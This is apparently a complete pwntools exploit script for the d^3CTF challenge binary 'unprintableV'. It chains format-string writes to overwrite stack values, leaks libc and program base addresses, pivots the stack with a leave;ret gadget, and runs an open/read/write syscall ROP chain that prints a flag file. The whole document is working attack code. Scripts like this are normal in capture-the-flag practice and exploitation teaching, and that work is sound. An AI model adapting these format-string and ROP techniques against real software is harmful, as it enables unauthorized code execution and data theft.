from pwn import *
# from LibcSearcher import *
import sys
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./unprintableV")
p = process("./unprintableV")

def sd(payload):
    p.send(payload.ljust(300,'\x00'))
    sleep(0.1)

def writeToAddr(addr, value):
	for i in range(8):
		payload = '%'+str(int((addr & 0xff) + i))+'c%6$hhn'
		print payload
		sd(payload)
		a = int(value & (0xffffffffffffffff >> (8*(7-i))))
		if i >=6:
			continue
		payload = '%'+str(a >> (8*i))+'c%10$hhn'
		print payload
		sd(payload)

a = p.recvuntil("\nmay")[-18:-4]
p.recv()
stack_addr = int(a, 16)



index = stack_addr & 0xff
payload ='%'+str(int(index))+'c%6$hhn'
sd(payload)
payload = '%' + str(0x20) + 'c%10$hhn'  
sd(payload)


payload = '%5440c%9$hn' # 0x1540 
sd(payload)

p.sendline('aaaaaaa'.ljust(0x12C-1,'\x00'))
x = p.recvuntil('aa',timeout=0.1)
if 'aa' not in x:
	print "unfortunately!"
	sys.exit()
else:
	# gdb.attach(p)
	pass

payload = '%15$pxxx'
sd(payload)
libc_addr = int(p.recvuntil("xxx")[-17:-3].strip(), 16) - 0x20830
print hex(libc_addr)

payload = '%11$pxxx'
sd(payload)
base_addr = int(p.recvuntil("xxx")[-17:-3].strip(), 16) - 0xb51
print hex(base_addr)

payload = '%' + str(0x20) + 'c%10$hhn'  
sd(payload)

payload = '%5440c%9$hn' # 0x1540 
sd(payload)
p.sendline('aaaaaaa'.ljust(0x12C-1,'\x00'))
x = p.recvuntil('aa',timeout=0.1)

fake_ebp_addr = stack_addr + 0x28
fake_retn_addr = stack_addr + 0x30

fake_ebp = 0x202070 + base_addr
leave_ret = 0x00000000000009f8 + base_addr
writeToAddr(fake_ebp_addr, fake_ebp)

writeToAddr(fake_retn_addr, leave_ret)

# recover menu's ebp
payload ='%'+str(int((fake_ebp_addr) & 0xff))+'c%6$hhn'
sd(payload)

# gdb.attach(p)

poprdi = 0xbc3+base_addr
poprsi = 0x00000000000202e8+libc_addr
poprax = 0x0000000000033544+libc_addr
poprdx = 0x0000000000001b92+libc_addr
syscall = 0x00000000000bc375+libc_addr

rop = "d^3CTF"
rop = rop.ljust(0x8, "\x00")
rop += ("flag"+"\x00\x00\x00\x00") * 2
rop += p64(poprdi) + p64(fake_ebp)
rop += p64(poprsi) + p64(0)
rop += p64(poprax) + p64(2)
rop += p64(poprdx) + p64(0)
rop += p64(syscall) # open

rop += p64(poprdi) + p64(1)
rop += p64(poprsi) + p64(fake_ebp+0x100)
rop += p64(poprax) + p64(0)
rop += p64(poprdx) + p64(0x20)
rop += p64(syscall) # read

rop += p64(poprdi) + p64(2)
rop += p64(poprsi) + p64(fake_ebp+0x100)
rop += p64(poprax) + p64(1)
rop += p64(poprdx) + p64(0x20)
rop += p64(syscall) # write
sd(rop)

p.interactive()
